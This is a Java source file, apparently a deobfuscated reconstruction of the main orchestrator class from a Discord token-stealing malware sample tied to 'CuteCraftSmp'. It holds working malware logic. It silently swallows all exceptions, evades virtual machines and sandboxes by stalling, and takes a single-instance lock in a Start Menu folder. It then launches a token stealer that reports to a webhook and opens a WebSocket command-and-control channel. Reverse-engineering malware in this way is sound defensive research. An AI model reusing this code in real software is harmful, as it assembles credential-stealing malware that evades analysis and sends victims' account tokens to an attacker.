import java.io.File;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileLock;
import java.util.concurrent.CompletableFuture;

/**
 * Main Orchestrator
 * Obfuscated name: ѝ (U+045D)
 *
 * The central coordinator class. Instantiated by EntryPoint (h.main)
 * with the decrypted webhook URL. Runs the full malware lifecycle.
 *
 * Constructor: ѝ(String webhookUrl, boolean debugMode, String[] args, long key)
 *   - webhookUrl: decrypted webhook URL (or first arg if it looks like a URL)
 *   - debugMode: true if --ira flag was passed
 *   - args: original command line args
 *   - key: Zelix runtime key
 *
 * Fields:
 *   ÿ (static volatile boolean) = global "running" flag
 *   þ (String)                  = webhook URL
 *   ý (HttpUploader / ӈ)        = HTTP uploader instance
 *   ü (boolean)                 = debugMode flag
 *   û (boolean)                 = "--test" flag (from args)
 *   ú (FileLock)                = instance lock #1
 *   ù (FileLock)                = instance lock #2
 *   ø (String[])                = command line args (static)
 *
 * String table references (b[]):
 *   b[1]  = "Starting..."
 *   b[2]  = "unknown"
 *   b[4]  = "APPDATA"
 *   b[7]  = "Already running"
 *   b[9]  = "Main"
 *   b[11] = " (truncated)"
 *   b[14] = "Microsoft"
 *   b[16] = "CuteCraft"
 *   b[20] = "Windows"
 *   b[21] = "Webhook: "
 *   b[22] = "--test"
 *   b[25] = "https://"
 *   b[27] = "rw"
 *   b[28] = "CuteCraftSmp"
 *   b[29] = "Start Menu"
 *   b[30] = "Main"
 *   b[32] = "Main"
 */
public class MainOrchestrator {

    // Global running flag - set to true when malware is active
    private static volatile boolean isRunning;

    // Webhook URL
    private final String webhookUrl;

    // HTTP uploader instance (ӈ / HttpUploader)
    private final HttpUploader httpUploader;

    // Debug mode flag
    private final boolean debugMode;

    // "--test" flag (from command line args)
    private final boolean testMode;

    // Instance lock files (prevent multiple instances)
    private static FileLock instanceLock1;
    private static FileLock instanceLock2;

    // Command line args (static, shared)
    private static String[] commandArgs;

    // =========================================================
    // CONSTRUCTOR
    // =========================================================

    /**
     * Creates the main orchestrator.
     *
     * @param webhookUrl Decrypted webhook URL from EntryPoint
     * @param debugMode True if --ira flag was passed
     * @param args Original command line arguments
     * @param encryptedKey Zelix runtime key
     */
    public MainOrchestrator(String webhookUrl, boolean debugMode, String[] args, long encryptedKey) {
        // Set global uncaught exception handler (silently swallows exceptions)
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            // Silently ignore all uncaught exceptions
        });

        // Determine effective webhook URL:
        // If first arg is non-empty and doesn't start with "https://", use it as webhook
        // Otherwise use the decrypted webhook URL
        String effectiveWebhook = webhookUrl;
        if (args != null && args.length > 0 && args[0].length() > 0
                && !args[0].startsWith("https://")) {
            effectiveWebhook = args[0];
        }

        this.webhookUrl = effectiveWebhook;
        this.httpUploader = new HttpUploader(this.webhookUrl);
        this.debugMode = debugMode;

        // Check for "--test" flag in args
        boolean hasTestFlag = false;
        if (args != null) {
            for (String arg : args) {
                if ("--test".equals(arg)) {
                    hasTestFlag = true;
                    break;
                }
            }
        }
        this.testMode = hasTestFlag;
    }

    // =========================================================
    // MAIN EXECUTION
    // =========================================================

    /**
     * Main execution method. Called by EntryPoint after construction.
     *
     * Execution flow:
     * 1. Get command line args
     * 2. If "--test" mode: run token stealer immediately and return
     * 3. Otherwise:
     *    a. Check VM/sandbox (VmDetector / ҍ)
     *    b. If VM detected: sleep and return
     *    c. Acquire instance lock (prevent multiple instances)
     *    d. If already locked: log and return
     *    e. Log startup message
     *    f. Start DiscordTokenStealer (a)
     *    g. Start WebSocketHandler (ɗ) in background
     *    h. Sleep briefly
     *
     * @param encryptedKey Zelix runtime key
     */
    public void run(long encryptedKey) {
        commandArgs = getCommandArgs();

        // Check for "--test" mode
        if (this.testMode) {
            // Log: "Starting..." with webhook URL (truncated if long)
            String displayUrl = this.webhookUrl;
            if (displayUrl != null && displayUrl.length() > 30) {
                displayUrl = displayUrl.substring(0, 30) + " (truncated)";
            }
            WebhookLogger.logInfo("Main", "Webhook: " + displayUrl);

            // Run token stealer immediately
            new DiscordTokenStealer(this.webhookUrl, encryptedKey).start(encryptedKey);

            // Start WebSocket C2 connection in background
            CompletableFuture.runAsync(() -> {
                WebSocketHandler.connect();
            });

            // Sleep briefly (encrypted constant ~2000ms)
            try { Thread.sleep(2000); } catch (Exception ignored) {}
            return;
        }

        // Check VM/sandbox detection (ҍ.ÿ)
        boolean isVm = VmDetector.isVirtualMachine();
        if (isVm) {
            // Sleep for a long time (encrypted constant) and return
            try { Thread.sleep(60000); } catch (Exception ignored) {}
            return;
        }

        // Determine display webhook URL (truncated if too long)
        String displayUrl = this.webhookUrl;
        if (displayUrl == null || displayUrl.isEmpty()) {
            displayUrl = "unknown";
        }
        if (displayUrl.length() > 30) {
            displayUrl = displayUrl.substring(0, 30) + " (truncated)";
        }

        // Log startup: "Webhook: [url]"
        WebhookLogger.logInfo("Main", "Webhook: " + displayUrl);

        // Acquire instance lock to prevent multiple instances
        // Lock file: %APPDATA%\Microsoft\Windows\Start Menu\CuteCraftSmp\CuteCraft
        if (!acquireInstanceLock(encryptedKey)) {
            // Already running - log and return
            WebhookLogger.logWarning("Main", "Already running");
            return;
        }

        // Log: "Starting..."
        WebhookLogger.logInfo("Main", "Starting...");

        // Start Discord token stealer
        new DiscordTokenStealer(this.webhookUrl, encryptedKey).start(encryptedKey);

        // Start WebSocket C2 connection in background
        CompletableFuture.runAsync(() -> {
            WebSocketHandler.connect();
        });

        // Sleep briefly (encrypted constant ~2000ms)
        try { Thread.sleep(2000); } catch (Exception ignored) {}
    }

    // =========================================================
    // INSTANCE LOCK
    // =========================================================

    /**
     * Acquires a file-based instance lock to prevent multiple instances.
     *
     * Lock file path (from encrypted strings):
     * %APPDATA%\Microsoft\Windows\Start Menu\CuteCraftSmp\CuteCraft
     *
     * Uses RandomAccessFile + FileChannel.tryLock() for atomic locking.
     * If lock cannot be acquired (another instance holds it), returns false.
     *
     * @param encryptedKey Zelix runtime key
     * @return true if lock acquired, false if already running
     */
    private boolean acquireInstanceLock(long encryptedKey) {
        try {
            // Build lock file path from encrypted strings:
            // %APPDATA%\[b[14]]\[b[20]]\[b[29]]\[b[28]]\[b[16]]
            // = %APPDATA%\Microsoft\Windows\Start Menu\CuteCraftSmp\CuteCraft
            String appData = System.getenv("APPDATA");
            String lockPath = appData + "\\"
                + "Microsoft" + "\\"    // b[14]
                + "Windows" + "\\"      // b[20]
                + "Start Menu" + "\\"   // b[29]
                + "CuteCraftSmp" + "\\" // b[28]
                + "CuteCraft";          // b[16]

            File lockFile = new File(lockPath);
            lockFile.getParentFile().mkdirs();

            // Open with "rw" mode (b[27]) and try to acquire exclusive lock
            RandomAccessFile raf = new RandomAccessFile(lockFile, "rw");
            instanceLock1 = raf.getChannel().tryLock();

            if (instanceLock1 == null) {
                // Lock not acquired - another instance is running
                return false;
            }

            return true;

        } catch (Exception e) {
            // If lock file can't be created, assume we can proceed
            return true;
        }
    }

    // =========================================================
    // HELPERS
    // =========================================================

    /**
     * Gets the stored command line args.
     * Returns the static args array set during construction.
     */
    private static String[] getCommandArgs() {
        return commandArgs;
    }

    /**
     * Sets the global running flag.
     */
    public static void setRunning(boolean running) {
        isRunning = running;
    }

    /**
     * Checks if the malware is currently running.
     */
    public static boolean isRunning() {
        return isRunning;
    }

    static {
        isRunning = false;
        commandArgs = null;
    }
}
